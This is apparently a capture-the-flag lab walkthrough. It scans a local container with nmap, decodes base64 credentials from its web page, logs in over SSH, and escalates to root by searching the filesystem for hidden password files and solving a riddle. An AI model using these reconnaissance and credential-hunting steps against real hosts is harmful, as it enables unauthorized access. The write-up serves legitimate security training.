# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 0.049/0.057/0.065/0.008 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 11:18 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: A6:75:A9:4C:67:A0 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 11:19 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 cc:d2:9b:60:14:16:27:b3:b9:f8:79:10:df:a1:f3:24 (ECDSA)
|_  256 37:a2:b2:b2:26:f2:07:d1:83:7a:ff:98:8d:91:77:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: A6:75:A9:4C:67:A0 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds
```
# Web enumeration
## Index page
``` bash
curl -s http://172.17.0.2 | tail -1
#.........................................................................................................ZGFuaWVsYQ== : Zm9jYXJvamE=
```
That looks like **base64** codified strings
The quantity of character in a *base64 codified string* is multiple of four, if not it fills that up with '='
``` bash
echo 'ZGFuaWVsYQ==' | base64 -d
daniela
echo 'Zm9jYXJvamE=' | base64 -d
focaroja
```
# SSH
``` bash
ssh daniela@172.17.0.2
```
# Privilege escalation
## Lateral movement: Daniela -> Diego
``` bash
cat Desktop/nota
Daniela no recuerdo donde guarde la password de root, si la encuentras me dices.
find / -name *diego* 2>/dev/null
/home/daniela/.secreto/passdiego
/home/diego
cat .secreto/passdiego
YmFsbGVuYW5lZ3Jh
echo 'YmFsbGVuYW5lZ3Jh' | base64 -d
ballenanegra
```
``` bash
su diego
```
## Lateral movement: Diego -> root
``` bash
find / -regex .*pass.* 2>/dev/null | grep .passroot
/home/diego/.passroot/.pass
cat .passroot/.pass
YWNhdGFtcG9jb2VzdGE=
echo 'YWNhdGFtcG9jb2VzdGE=' | base64 -d
acatampocoesta
```
``` bash
cat .local/share/.-
password de root

En un mundo de hielo, me muevo sin prisa,
con un pelaje que brilla, como la brisa.
No soy un rey, pero en cuentos soy fiel,
de un color inusual, como el cielo y el mar
tambien.
Soy amigo de los ni~nos, en historias de
ensue~no.
Quien soy, que en el frio encuentro mi due~no?
```
It is talking about a polar bear with blue coat
The password must be something like: *osopolar*
``` bash
su root
whoami
root
```
